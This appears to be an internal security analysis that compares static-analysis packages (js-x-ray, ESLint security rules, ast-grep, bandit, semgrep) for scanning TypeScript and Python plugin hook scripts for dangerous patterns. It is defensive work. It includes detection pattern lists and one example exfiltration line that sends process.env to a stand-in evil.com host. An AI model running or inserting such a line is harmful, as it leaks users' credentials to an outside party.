---
title: ANALYSIS-051 TypeScript and Python Security Analysis Packages
type: analysis
permalink: analysis/analysis-051-typescript-and-python-security-analysis-packages
tags:
- security
- typescript
- python
- static-analysis
- hooks
- ADR-004
---

# ANALYSIS-051 TypeScript and Python Security Analysis Packages

## 1. Objective and Scope

**Objective**: What npm packages and tools exist to statically analyze TypeScript/JavaScript and Python hook SCRIPT FILES for dangerous patterns before approving plugin installation?

**Scope**: npm packages for JS/TS security analysis (eslint-plugin-security, js-x-ray, ast-grep, ts-morph, acorn/espree), Python analysis from JS/TS (bandit via shell-out, JS-based Python AST parsers, ast-grep with Python support), and programmatic ESLint usage from Bun. Focused on tools that can analyze a code STRING without writing to disk.

**Out of scope**: Shell command analysis (covered in ANALYSIS-050), runtime sandboxing (covered in ANALYSIS-050 RQ3), full threat model (deferred to ADR-004).

## 2. Context

ANALYSIS-050 established the three-layer security model (static analysis, informed consent, runtime sandboxing) for shell hook commands using `shell-quote` tokenization. That analysis covers bash/shell commands only. Plugins may also include TypeScript/JavaScript or Python hook scripts that require different analysis tooling.

The plugin installer runs on Bun. Tools must either be pure JavaScript/TypeScript npm packages or use napi-rs native modules (which Bun generally supports). Shelling out to system binaries (like bandit) is acceptable as a fallback but not preferred.

Key dangerous patterns to detect across both languages: network access, filesystem access outside project boundaries, environment variable reading (credential exfiltration), process spawning, dynamic code execution (eval/exec/Function), obfuscation (base64 encoding), and known malicious signatures.

## 3. Approach

**Methodology**: Web research across npm registry, GitHub, package documentation, ESLint API docs, ast-grep docs, and security tooling ecosystems. Evaluated packages for download counts, maintenance status, Bun compatibility, ability to analyze code strings (not just files on disk), and coverage of target dangerous patterns.

**Tools Used**: WebSearch, WebFetch (GitHub raw content, ESLint docs, ast-grep docs, dev.to articles).

**Limitations**: npm download counts are point-in-time (March 2026). Bun compatibility for napi-rs modules not independently verified. No hands-on testing. Some npm pages blocked direct fetch (403).

## 4. Data and Analysis

### 4.1 TypeScript/JavaScript Security Analysis

#### 4.1.1 ESLint Linter API (Programmatic, In-Memory)

**Can ESLint analyze a code string from Bun without writing to disk?** Yes.

The `Linter` class (not the `ESLint` class) operates entirely in-memory with no filesystem access. It accepts a code string and returns lint messages.

```javascript
const { Linter } = require("eslint");
const linter = new Linter({ configType: "flat" });
const messages = linter.verify("eval(userInput)", {
  languageOptions: { ecmaVersion: 2025, sourceType: "module" },
  rules: { "no-eval": "error" }
}, { filename: "hook.js" });
```

Key capabilities:
- `verify(code, config, options)` -- code is a string, no file required
- `defineRule(name, rule)` and `defineRules(rulesObj)` -- register custom rules programmatically
- Flat config mode supported (default in ESLint 9+)
- Custom parsers can be passed in config for TypeScript support

**Bun compatibility**: Partial. ESLint 9.18.0+ supports Bun for TypeScript config files. Some edge cases reported (issue #17130: "parent.require is not a function" with certain configs). The `Linter` class is lower-level and more likely to work since it avoids filesystem operations that cause Bun issues.

**Limitation**: The `Linter` class cannot load plugins via flat config's `plugins` key the same way the `ESLint` class does. You must use `defineRules()` to register plugin rules manually, or pass them through the config object's `plugins` property in flat config format.

| Attribute | Value |
|-----------|-------|
| npm package | `eslint` |
| Weekly downloads | ~45M+ (ESLint core) |
| In-memory analysis | Yes (Linter class) |
| Custom rules | Yes (defineRule/defineRules) |
| TypeScript support | Via custom parser (typescript-eslint) |
| Bun compatibility | Partial (Linter class likely works; edge cases exist) |

#### 4.1.2 eslint-plugin-security

**What it detects (14 rules)**:

| Rule | Detects | Relevant to Hook Analysis |
|------|---------|--------------------------|
| `detect-eval-with-expression` | `eval(variable)` | Yes -- dynamic code execution |
| `detect-child-process` | `child_process` usage, dynamic `exec()` | Yes -- process spawning |
| `detect-non-literal-fs-filename` | Dynamic filesystem paths | Yes -- filesystem access |
| `detect-non-literal-require` | Dynamic `require()` | Yes -- obfuscated imports |
| `detect-non-literal-regexp` | Dynamic regex patterns | Low -- ReDoS risk |
| `detect-object-injection` | Bracket notation with variables | Low -- prototype pollution |
| `detect-possible-timing-attacks` | Sequential comparison operators | Low |
| `detect-pseudoRandomBytes` | Weak random generation | Low |
| `detect-unsafe-regex` | ReDoS-prone regex | Low |
| `detect-buffer-noassert` | Buffer with noAssert | Low |
| `detect-disable-mustache-escape` | Disabled HTML escaping | Low |
| `detect-no-csrf-before-method-override` | Express middleware ordering | Not relevant |
| `detect-new-buffer` | Non-literal Buffer arguments | Low |
| `detect-bidi-characters` | Trojan source (unicode bidi) | Yes -- obfuscation |

| Attribute | Value |
|-----------|-------|
| npm package | `eslint-plugin-security` |
| Weekly downloads | 1,624,140 |
| Version | 4.0.0 |
| Last published | ~March 2026 (11 days ago at time of research) |
| License | Apache-2.0 |
| Maintainer | eslint-community |
| Flat config support | Yes |

**Verdict**: Covers 4 of our target patterns well (eval, child_process, filesystem, obfuscation). Does NOT detect network access (fetch, http, XMLHttpRequest), environment variable reading (process.env), or base64 obfuscation. Useful as a component but insufficient alone.

**Programmatic integration**: Rules can be registered via `linter.defineRules()` by extracting the rules object from the plugin. The plugin exports `configs.recommended` for flat config. Each rule is a standard ESLint rule object that can be passed to the Linter class.

#### 4.1.3 @nodesecure/js-x-ray

The strongest candidate for JS/TS malicious pattern detection. Purpose-built SAST scanner for detecting malicious code patterns in JavaScript.

**API**: `runASTAnalysis(codeString)` accepts a string directly. No file required.

```javascript
const { runASTAnalysis } = require("@nodesecure/js-x-ray");
const { warnings, dependencies } = runASTAnalysis(hookCode);
```

**Detected warning types (16 default + 2 optional)**:

| Warning | Description | Relevant |
|---------|-------------|----------|
| `unsafe-stmt` | `eval()`, `Function("")` usage | Yes -- dynamic code execution |
| `unsafe-import` | Unresolvable import/require | Yes -- obfuscated imports |
| `unsafe-command` | Suspicious `spawn()`/`exec()` commands | Yes -- process spawning |
| `encoded-literal` | Base64/hex encoded strings | Yes -- obfuscation |
| `obfuscated-code` | High probability of obfuscation detected | Yes -- obfuscation |
| `data-exfiltration` | Data exfiltration patterns | Yes -- network/credential theft |
| `serialize-environment` | `process.env` serialization | Yes -- credential exfiltration |
| `weak-crypto` | MD5, SHA1, weak algorithms | Moderate |
| `shady-link` | Suspicious URLs/IPs/hostnames | Yes -- network indicators |
| `sql-injection` | SQL injection patterns | Low |
| `monkey-patch` | Prototype/global monkey patching | Moderate |
| `suspicious-literal` | Suspicious string patterns | Moderate |
| `suspicious-file` | File with >10 encoded literals | Yes -- bulk obfuscation |
| `short-identifiers` | Minified/obfuscated variable names | Moderate |
| `parsing-error` | AST parse failures | Diagnostic |
| `unsafe-regex` | ReDoS-prone regex | Low |
| `synchronous-io` (optional) | Synchronous I/O operations | Yes -- filesystem access |
| `log-usage` (optional) | Console/log usage | Low |

**Key strengths**:
- Analyzes code STRINGS directly (no filesystem)
- Detects `process.env` serialization (credential exfiltration) -- unique among tools
- Detects data exfiltration patterns
- Identifies obfuscation tools (jsfuck, jjencode, obfuscator.io)
- AST-based analysis with variable tracing (VariableTracer in v6+)
- Extracts URLs, IPs, hostnames, emails from code
- Automatic ESM retry if CJS parsing fails
- Pure JavaScript (no native modules)

| Attribute | Value |
|-----------|-------|
| npm package | `@nodesecure/js-x-ray` |
| Weekly downloads | 1,140 |
| Version | 10.0.0 |
| Last published | ~February 2026 |
| License | MIT |
| Bun compatibility | Likely (pure JS, AST-based) |
| GitHub | github.com/NodeSecure/js-x-ray |

**Limitation**: Low download count (1,140/week). This reflects its niche focus (malicious code detection for supply chain), not quality. It is the engine behind NodeSecure CLI. The older `js-x-ray` package (unscoped) is deprecated in favor of `@nodesecure/js-x-ray`.

**Gap**: Does not explicitly detect `fetch()`, `http.request()`, `XMLHttpRequest`, or `net.Socket` as network access patterns. Detects the CONSEQUENCES (data exfiltration, shady links) but not the raw API calls. Custom rules or supplementary detection needed for network access APIs.

#### 4.1.4 ast-grep (@ast-grep/napi)

Multi-language AST tool with native NAPI bindings. Can parse JS, TS, and Python code strings and search for patterns using a grep-like syntax.

```javascript
import { parse, Lang } from '@ast-grep/napi';
const ast = parse(Lang.JavaScript, hookCode);
const evalCalls = ast.root().findAll('eval($A)');
const fetchCalls = ast.root().findAll('fetch($$$ARGS)');
const execCalls = ast.root().findAll('child_process.exec($$$ARGS)');
```

**Key capabilities**:
- `parse(Lang, codeString)` analyzes strings directly
- Pattern syntax: `eval($A)`, `fetch($$$ARGS)`, `process.env.$KEY`
- Built-in languages: JavaScript, TypeScript, TSX, HTML, CSS
- Python via `@ast-grep/lang-python` (dynamic registration)
- `find()` and `findAll()` for pattern matching
- Node kind filtering and rule-based matching
- Built on tree-sitter (Rust, via napi-rs)

| Attribute | Value |
|-----------|-------|
| npm package | `@ast-grep/napi` |
| Weekly downloads | Not measured (version 0.41.0) |
| Last published | ~March 2026 (8 days ago) |
| License | MIT |
| Bun compatibility | Likely (napi-rs; Bun supports most NAPI modules, some edge cases with symbol resolution reported) |

**Strengths**: Can detect ANY function call pattern. Not limited to predefined rules. Supports both JS/TS AND Python from the same tool. Fast (Rust-based tree-sitter parsing).

**Limitation**: No built-in security rules. You must define every dangerous pattern yourself. This is a building block, not a turnkey solution. Also, napi-rs modules have had intermittent Bun compatibility issues (symbol resolution errors in issues #21432, #23136).

#### 4.1.5 ts-morph

TypeScript Compiler API wrapper for AST analysis and code manipulation.

| Attribute | Value |
|-----------|-------|
| npm package | `ts-morph` |
| Weekly downloads | 2,870,791 - 4,599,420 (varies by source) |
| Version | 27.0.x |
| License | MIT |
| In-memory analysis | Yes (`useInMemoryFileSystem: true`) |
| Bun compatibility | Likely (wraps TypeScript compiler, pure JS) |

**In-memory usage**:
```javascript
const { Project } = require("ts-morph");
const project = new Project({ useInMemoryFileSystem: true });
const sourceFile = project.createSourceFile("hook.ts", hookCode);
// Navigate AST: sourceFile.getDescendantsOfKind(...)
```

**Verdict**: Powerful for TypeScript-specific analysis (type information, import resolution) but heavyweight for simple pattern detection. Best suited for deep analysis where type information matters. Overkill for detecting `eval()` or `fetch()` calls. The full TypeScript compiler is a large dependency.

#### 4.1.6 Acorn/Espree (Low-Level Parsers)

Acorn and Espree (ESLint's parser, built on Acorn) parse JavaScript strings into ESTree-compliant ASTs.

| Package | Weekly Downloads | Purpose |
|---------|-----------------|---------|
| `acorn` | ~45M+ | JavaScript parser, ESTree output |
| `espree` | ~40M+ | ESLint's parser (extends Acorn) |

Both accept code strings: `acorn.parse(code, options)`. Output is a standard AST that can be walked with `acorn-walk` or custom traversal.

**Verdict**: Too low-level. You would need to write all pattern detection from scratch. ESLint's Linter class already wraps Espree and provides the rule infrastructure. Use ESLint programmatic API instead.

### 4.2 Python Security Analysis

#### 4.2.1 Bandit (Shell Out)

The standard Python SAST tool. 47 built-in security checks across 7 categories.

**Relevant detections**:

| Check | ID | Description |
|-------|----|-------------|
| Use of exec/eval | B102, B307 | Dynamic code execution |
| subprocess calls | B602, B603, B604 | subprocess.Popen, subprocess.call, subprocess.run with shell=True |
| os.system/os.popen | B605, B606 | Shell command execution |
| Hardcoded passwords | B105, B106, B107 | Credential storage |
| Insecure hashing | B303, B304 | MD5, SHA1 |
| Insecure temp files | B108 | mktemp without secure mode |
| pickle usage | B301 | Deserialization attacks |
| requests without verify | B501 | TLS verification disabled |

**Distribution**: Python-only (pip install). No npm package. No WASM build. Available as Docker image. Must shell out: `bandit -f json -r script.py`.

| Attribute | Value |
|-----------|-------|
| Package | `bandit` (PyPI) |
| npm wrapper | None exists |
| Requires Python | Yes |
| Output format | JSON, CSV, HTML, YAML |
| GitHub stars | 7,000+ |
| Maintenance | Active (PyCQA organization) |

**Integration approach**: Write hook script to temp file, shell out to `bandit -f json`, parse JSON output. Requires Python installed on user's machine.

**Limitation**: Requires Python runtime. Not all users will have Python installed. Cannot analyze a code string directly from the CLI (requires a file path). Adds ~2-5 seconds latency for subprocess execution.

#### 4.2.2 ast-grep with Python Support

ast-grep can parse Python via `@ast-grep/lang-python` dynamic language registration.

```javascript
import python from '@ast-grep/lang-python';
import { registerDynamicLanguage, parse } from '@ast-grep/napi';
registerDynamicLanguage({ python });

const ast = parse('python', hookCode);
const evalCalls = ast.root().findAll('eval($A)');
const execCalls = ast.root().findAll('exec($A)');
const osCalls = ast.root().findAll('os.system($A)');
const subprocessCalls = ast.root().findAll('subprocess.run($$$ARGS)');
```

**Strengths**: Same tool for JS/TS AND Python. Analyzes code strings directly. No Python runtime required. Fast (Rust-based).

**Limitation**: Pattern matching only (no data flow analysis). Must define all dangerous patterns manually. napi-rs Bun compatibility has edge cases.

#### 4.2.3 JavaScript-Based Python AST Parsers

| Package | Weekly Downloads | Last Updated | Based On | Maintenance |
|---------|-----------------|--------------|----------|-------------|
| `python-ast` | Low | 5 years ago | antlr4ts | Unmaintained |
| `dt-python-parser` | 22 | 4 years ago | ANTLR4 | Unmaintained |
| `@qoretechnologies/python-parser` | Low | 4 years ago | Custom (fork of Microsoft's) | Unmaintained |
| `@msrvida/python-program-analysis` | Low | Archived Nov 2019 | Custom | Archived |

**Microsoft python-program-analysis** (archived, now `@qoretechnologies/python-parser`):
- Parses Python 3 code STRING via `parse(codeString)`
- Produces control-flow graphs and def-use chains
- TypeScript library, MIT license
- 54 GitHub stars
- Archived in 2019, forked by Qore Technologies

**dt-python-parser**:
- ANTLR4-based, parses Python code strings
- Visitor and Listener patterns for AST traversal
- 928 kB bundle size
- 22 weekly downloads, last updated 4 years ago

**Verdict**: All JavaScript-based Python parsers are unmaintained (2-5 years stale). None have meaningful adoption. Using them for security analysis would mean: (1) depending on abandoned code, (2) building all security rules from scratch on top of raw ASTs, (3) risking parser bugs with newer Python syntax.

#### 4.2.4 Semgrep

Multi-language SAST tool supporting both JS/TS and Python with extensive rule libraries.

| Attribute | Value |
|-----------|-------|
| Distribution | pip, Homebrew, Docker |
| npm package | None |
| WASM build | None |
| Languages | 30+ including JS, TS, Python |
| Rule library | Thousands of community rules (OWASP Top 10 coverage) |
| License | LGPL-2.1 (OSS engine) |

**Capabilities**: Cross-file analysis, taint tracking, dataflow analysis for JS/TS and Python. Framework-aware (Express, NestJS, Flask, Django). Detects injection, SSRF, XSS, and more.

**Integration approach**: Shell out to `semgrep --json --config=auto script.py`. Requires Python (installed via pip) or Docker.

**Verdict**: Most capable multi-language SAST but requires Python or Docker. No npm package, no WASM build. Too heavy for single-file hook analysis. Better suited for CI pipelines than real-time plugin installation.

### 4.3 Pattern Coverage Gap Analysis

| Dangerous Pattern | eslint-plugin-security | @nodesecure/js-x-ray | ast-grep (custom) | Bandit (Python) |
|-------------------|----------------------|---------------------|-------------------|-----------------|
| Network access (fetch, http, requests) | No | Partial (shady-link, data-exfiltration) | Yes (custom pattern) | Partial (B501) |
| Filesystem outside project | Yes (detect-non-literal-fs-filename) | Partial (synchronous-io) | Yes (custom pattern) | Partial (B108) |
| Environment variable reading | No | Yes (serialize-environment) | Yes (custom pattern) | No |
| Process spawning | Yes (detect-child-process) | Yes (unsafe-command) | Yes (custom pattern) | Yes (B602-B606) |
| Dynamic code execution | Yes (detect-eval-with-expression) | Yes (unsafe-stmt) | Yes (custom pattern) | Yes (B102, B307) |
| Obfuscation (base64) | No | Yes (encoded-literal, obfuscated-code) | Partial (custom) | No |
| Known malicious signatures | No | Yes (multiple detection categories) | No | No |
| Trojan source (bidi) | Yes (detect-bidi-characters) | No | No | No |

### 4.4 Recommended Approach by Language

#### For TypeScript/JavaScript Hook Scripts

**Primary**: `@nodesecure/js-x-ray` via `runASTAnalysis(codeString)`
- Covers: eval, process.env, data exfiltration, obfuscation, encoded literals, unsafe commands
- Pure JS, likely Bun compatible
- String input, no filesystem required

**Supplementary**: ESLint `Linter` class with `eslint-plugin-security` rules
- Covers: child_process, filesystem access, bidi characters, non-literal require
- Register rules via `linter.defineRules()`
- String input via `linter.verify(code, config)`

**Custom patterns via ast-grep or direct AST walking**:
- Cover gaps: `fetch()`, `http.request()`, `XMLHttpRequest`, `net.Socket`, `WebSocket`
- Cover gaps: `process.env` reads (not just serialization)
- Cover gaps: `Buffer.from(x, 'base64')` followed by `eval()`

#### For Python Hook Scripts

**Option A (Preferred if Python available)**: Shell out to `bandit -f json`
- 47 built-in checks, JSON output, established tool
- Requires Python installed, requires temp file, adds latency

**Option B (No Python dependency)**: `@ast-grep/napi` with `@ast-grep/lang-python`
- Parse Python code string, match dangerous patterns
- Must define all patterns manually
- napi-rs Bun compatibility has edge cases
- Covers: eval, exec, os.system, subprocess, import os, import socket, requests.get, urllib

**Option C (Fallback)**: Regex-based pattern matching
- Simple but brittle
- Match known dangerous function names and import patterns
- High false positive/negative rate
- Zero dependencies, guaranteed Bun compatibility

**Recommended**: Option B as primary (ast-grep for zero-dependency Python analysis), Option A as enhanced mode when Python is detected on the system.

## 5. Results

### Package Comparison Matrix

| Package | Analyzes Strings | JS/TS | Python | Security-Focused | Weekly Downloads | Maintained | Bun Compatible |
|---------|-----------------|-------|--------|-------------------|-----------------|------------|----------------|
| `@nodesecure/js-x-ray` | Yes | Yes | No | Yes (malicious patterns) | 1,140 | Yes (v10) | Likely (pure JS) |
| `eslint` + `eslint-plugin-security` | Yes (Linter) | Yes | No | Yes (14 rules) | 1,624,140 (plugin) | Yes (v4) | Partial |
| `@ast-grep/napi` | Yes | Yes | Yes (via lang pkg) | No (generic AST) | Active | Yes (v0.41) | Likely (napi-rs) |
| `ts-morph` | Yes (in-memory FS) | Yes | No | No (generic AST) | 2,870,791 | Yes (v27) | Likely (pure JS) |
| `bandit` | No (file only) | No | Yes | Yes (47 checks) | N/A (PyPI) | Yes | N/A (shell out) |
| `semgrep` | No (file only) | Yes | Yes | Yes (thousands) | N/A (pip) | Yes | N/A (shell out) |
| `python-ast` | Yes | No | Yes (parse) | No | Low | No (5yr stale) | Unknown |
| `dt-python-parser` | Yes | No | Yes (parse) | No | 22 | No (4yr stale) | Unknown |

### Key Findings

1. **@nodesecure/js-x-ray is the best fit for JS/TS malicious pattern detection.** It analyzes code strings, detects obfuscation/exfiltration/eval/process.env patterns, and is pure JavaScript. Low download count reflects niche focus, not quality.

2. **ESLint Linter class CAN analyze code strings programmatically.** The `verify()` method accepts strings. Plugin rules can be registered via `defineRules()`. This enables using eslint-plugin-security rules without filesystem access.

3. **No npm package exists for Python security analysis without Python installed.** Bandit requires Python. Semgrep requires Python or Docker. All JS-based Python parsers are unmaintained.

4. **ast-grep is the most promising cross-language option.** It can parse both JS/TS and Python code strings from the same npm package. But it provides no built-in security rules -- all patterns must be defined manually.

5. **Network access detection is a gap across all tools.** None of the security-focused tools explicitly flag `fetch()`, `http.request()`, or `requests.get()` as dangerous patterns. Custom detection is required.

6. **Bun compatibility is "likely but unverified" for most tools.** Pure JS packages (js-x-ray, eslint Linter) should work. napi-rs packages (ast-grep) have intermittent issues. ESLint's full API has known Bun edge cases.

## 6. Discussion

### Recommended Architecture for Multi-Language Hook Analysis

```text
Hook Script File
     |
     v
Language Detection (extension: .ts/.js/.mjs/.cjs/.py/.sh)
     |
     +-- Shell (.sh, .bash) --> shell-quote tokenizer (ANALYSIS-050)
     |
     +-- JS/TS (.js/.ts/.mjs/.cjs) --> @nodesecure/js-x-ray (primary)
     |                               + ESLint Linter + eslint-plugin-security (supplementary)
     |                               + Custom patterns for network APIs (gap fill)
     |
     +-- Python (.py) --> ast-grep + @ast-grep/lang-python (primary, no Python dep)
     |                  + bandit shell-out (enhanced, if Python available)
     |
     v
Unified Risk Report (same format as ANALYSIS-050 shell analysis)
```

### Build vs Buy Assessment

For JS/TS: **Buy (js-x-ray) + Build (gap patterns)**. js-x-ray covers 70% of target patterns. Custom patterns needed for network API detection and some env var patterns.

For Python: **Build (ast-grep patterns) + Buy (bandit, optional)**. No npm package exists. ast-grep provides the parser; we provide the security patterns. Bandit adds value when Python is available but cannot be a hard dependency.

### Risk: False Positives

All pattern-based detection will produce false positives. A hook script that legitimately uses `fetch()` to download a required resource will be flagged. The mitigation is the same as ANALYSIS-050: flag and explain, let the user decide. The risk report should distinguish "this pattern was detected" from "this is definitely malicious."

## 7. Recommendations

| Priority | Recommendation | Rationale | Effort |
|----------|---------------|-----------|--------|
| P0 | Integrate `@nodesecure/js-x-ray` for JS/TS hook analysis | Best coverage of malicious patterns; analyzes strings; pure JS | 1-2 days |
| P0 | Build custom network API detection patterns | Gap in all existing tools; must detect fetch/http/XMLHttpRequest/WebSocket | 1 day |
| P1 | Integrate ESLint Linter + eslint-plugin-security as supplementary layer | Adds child_process, filesystem, bidi detection; well-maintained | 1 day |
| P1 | Build Python analysis via ast-grep patterns | No npm alternative; ast-grep parses Python strings; define ~15-20 dangerous patterns | 2 days |
| P2 | Add optional bandit integration (shell out when Python available) | 47 built-in checks; best Python SAST; graceful degradation if Python missing | 0.5 day |
| P2 | Build process.env read detection (not just serialization) | js-x-ray detects serialization but not individual reads like process.env.API_KEY | 0.5 day |
| P3 | Evaluate ast-grep for unified JS/TS/Python analysis (single tool) | Could replace both js-x-ray and custom Python patterns; but requires defining ALL rules | 2-3 days |

## 8. Conclusion

**Verdict**: Proceed with js-x-ray (JS/TS) + ast-grep patterns (Python) + ESLint supplementary

**Confidence**: High for JS/TS approach, Medium for Python approach

**Rationale**: `@nodesecure/js-x-ray` is purpose-built for malicious JS pattern detection, analyzes code strings, and is pure JavaScript. It covers the hardest-to-build detections (obfuscation identification, process.env serialization, data exfiltration patterns). ESLint's programmatic Linter API fills gaps (child_process, filesystem). For Python, no npm package exists for security analysis without Python installed. `ast-grep` with `@ast-grep/lang-python` provides a zero-Python-dependency parser that can match dangerous patterns. Optional `bandit` integration adds depth when Python is available.

### User Impact

- **What changes for you**: JS/TS and Python hook scripts get automated risk assessment alongside shell commands. The installer flags dangerous patterns (eval, network access, credential reading, process spawning) before you approve.
- **Effort required**: 5-7 days to integrate js-x-ray, ESLint Linter, ast-grep Python patterns, and custom gap-fill detections.
- **Risk if ignored**: Malicious TypeScript/Python hooks bypass all analysis. An attacker writes `fetch('https://evil.com/?' + JSON.stringify(process.env))` in a .ts hook file and current shell-only analysis misses it entirely.

## 9. Appendices

### Sources Consulted

- [eslint-plugin-security on npm](https://www.npmjs.com/package/eslint-plugin-security) -- 1.6M weekly downloads, 14 security rules
- [eslint-plugin-security on GitHub](https://github.com/eslint-community/eslint-plugin-security) -- full rule list and flat config support
- [ESLint Node.js API Reference](https://eslint.org/docs/latest/integrate/nodejs-api) -- Linter class, verify(), defineRules()
- [@nodesecure/js-x-ray on npm](https://www.npmjs.com/package/@nodesecure/js-x-ray) -- 1,140 weekly downloads, v10.0.0
- [js-x-ray on GitHub](https://github.com/NodeSecure/js-x-ray) -- warning types, runASTAnalysis API
- [JS-X-Ray 6.0 announcement](https://dev.to/nodesecure/js-x-ray-60-49ah) -- VariableTracer, improved detection
- [JS-X-Ray 2.0 announcement](https://dev.to/nodesecure/js-x-ray-2-0-1mk0) -- runASTAnalysis string API
- [@ast-grep/napi on npm](https://www.npmjs.com/package/@ast-grep/napi) -- v0.41.0, multi-language AST
- [ast-grep JavaScript API docs](https://ast-grep.github.io/guide/api-usage/js-api.html) -- parse(), find(), findAll()
- [ast-grep API Reference](https://ast-grep.github.io/reference/api.html) -- Lang enum, supported languages
- [@ast-grep/lang-python on npm](https://www.npmjs.com/package/@ast-grep/lang-python) -- Python support via dynamic registration
- [ts-morph on npm](https://www.npmjs.com/package/ts-morph) -- 2.8M+ weekly downloads, InMemoryFileSystemHost
- [Bandit on GitHub](https://github.com/PyCQA/bandit) -- Python SAST, 47 checks
- [Bandit documentation](https://bandit.readthedocs.io/) -- check IDs, severity/confidence
- [Bandit open-source review (Jan 2026)](https://www.helpnetsecurity.com/2026/01/21/bandit-open-source-tool-find-security-issues-python-code/)
- [Semgrep JavaScript deep dive (2025)](https://semgrep.dev/blog/2025/a-technical-deep-dive-into-semgreps-javascript-vulnerability-detection/)
- [Semgrep JS/TS announcement](https://semgrep.dev/products/product-updates/announcing-semgrep-codes-latest-javascript-and-typescript-analysis/)
- [python-ast on npm](https://www.npmjs.com/package/python-ast) -- v0.1.0, 5 years stale
- [dt-python-parser on npm](https://www.npmjs.com/package/dt-python-parser) -- v0.9.0, 22 weekly downloads, 4 years stale
- [Microsoft python-program-analysis on GitHub](https://github.com/microsoft/python-program-analysis) -- archived Nov 2019
- [@qoretechnologies/python-parser on npm](https://www.npmjs.com/package/@qoretechnologies/python-parser) -- fork of Microsoft's, 4 years stale
- [ESLint 2025 year in review](https://eslint.org/blog/2026/01/eslint-2025-year-review/)
- [ESLint Bun compatibility issue #17130](https://github.com/oven-sh/bun/issues/17130)
- [napi-rs Bun symbol resolution issue #21432](https://github.com/oven-sh/bun/issues/21432)
- [awesome-nodejs-security](https://github.com/lirantal/awesome-nodejs-security) -- curated security tool list
- [Bun napi-rs support issue #158](https://github.com/oven-sh/bun/issues/158)

### Data Transparency

- **Found**: npm download counts, version numbers, API signatures, rule lists, warning types, Bun compatibility signals, maintenance status for all evaluated packages. Programmatic ESLint API documentation including Linter.verify() and defineRules().
- **Not Found**: Independent Bun compatibility test results for js-x-ray or ast-grep/napi. False positive rates for any tool. Performance benchmarks for in-memory analysis. Whether js-x-ray explicitly detects fetch/http/net.Socket calls (evidence suggests it does not). Exact download counts for @ast-grep/napi.

## Observations

- [fact] @nodesecure/js-x-ray analyzes code strings via runASTAnalysis(str) and detects 16 malicious pattern categories including obfuscation, data exfiltration, and process.env serialization #js-security
- [fact] ESLint Linter class operates in-memory with no filesystem access; verify(codeString, config) and defineRules() enable programmatic security analysis #eslint-api
- [fact] eslint-plugin-security provides 14 rules at 1.6M weekly downloads; covers eval, child_process, filesystem, bidi but NOT network access or env var reading #eslint-security
- [fact] No npm package exists for Python security analysis without Python installed; all JS-based Python parsers are unmaintained (2-5 years stale) #python-gap
- [fact] ast-grep (@ast-grep/napi) can parse both JS/TS and Python code strings via napi-rs native module; requires manual pattern definition #ast-grep
- [technique] Layered JS/TS analysis: js-x-ray for malicious patterns + ESLint plugin-security for structural patterns + custom patterns for network API gaps #architecture
- [technique] Python analysis without Python dependency: ast-grep + @ast-grep/lang-python for pattern matching, optional bandit shell-out when Python available #python-approach
- [risk] Network access detection (fetch, http, requests, urllib, socket) is a gap across all evaluated security tools; custom detection required #gap
- [insight] js-x-ray's low download count (1,140/week) reflects niche supply-chain focus, not quality; it powers NodeSecure CLI and detects patterns no other npm tool covers #adoption
- [constraint] Bun compatibility is "likely but unverified" for pure JS packages and "edge cases possible" for napi-rs packages #bun-compatibility

## Relations

- extends [[ANALYSIS-050 Hook Command Security Analysis Tools and Approaches]]
- relates_to [[ADR-004 Plugin Security Model]]
- relates_to [[ANALYSIS-049 ADR-004 Security Model Scope and Forward References]]
- relates_to [[ADR-006-core-dependency-stack]]